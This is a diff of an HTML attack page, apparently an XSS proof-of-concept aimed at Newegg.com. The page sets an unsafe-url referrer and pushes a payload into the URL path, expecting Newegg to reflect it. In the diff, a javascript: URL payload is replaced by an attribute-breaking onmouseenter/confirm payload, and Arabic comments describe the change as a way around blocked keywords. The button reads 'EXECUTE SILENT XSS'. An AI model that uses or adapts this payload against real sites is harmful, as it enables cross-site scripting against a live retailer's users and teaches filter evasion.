@@ -3,26 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>VORTEX EXPLOIT SUCCESS</title>
+    <title>VORTEX BYPASS</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <h1 style="color:lime;">VORTEX SYSTEM: EXPLOIT READY</h1>
-    <p>Target: Newegg.com (Breadcrumb Protocol Hijacking)</p>
-
+    <h1 style="color:orange;">VORTEX BYPASS MODE</h1>
+    
     <a href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:lime; color:black; text-decoration:none; font-weight:bold; border-radius:5px;">
-        CLICK TO START ATTACK 🚀
+       style="padding:20px; background:orange; color:black; font-weight:bold; text-decoration:none; border-radius:5px;">
+        EXECUTE SILENT XSS 🚀
     </a>
 
     <script>
-        // الـ Payload الآن هو بروتوكول جافاسكربت
-        // سيقوم السكربت في نيوإيج بوضعه داخل الـ href الخاص بالـ Breadcrumb
-        var payload = "javascript:alert('VORTEX_XSS_BY_MOUAD\\nCaptured_Domain: '+document.domain)";
+        // بايلود يستخدم كسر الخاصية (') وتجنب الكلمات المحظورة
+        // استخدمنا confirm بدلاً من alert لزيادة فرص التجاوز
+        var bypassPayload = "x'onmouseenter='(confirm`XSS_BY_MOUAD`)'style='display:block;padding:20px";
         
-        // تغيير مسار الرابط ليصبح هو الـ Referrer
-        // نستخدم التشفير لضمان وصوله كاملاً
-        var attackPath = "/VORTEX/v/" + payload;
+        var attackPath = "/" + bypassPayload + "/";
 
         window.history.pushState({}, '', attackPath);
     </script>
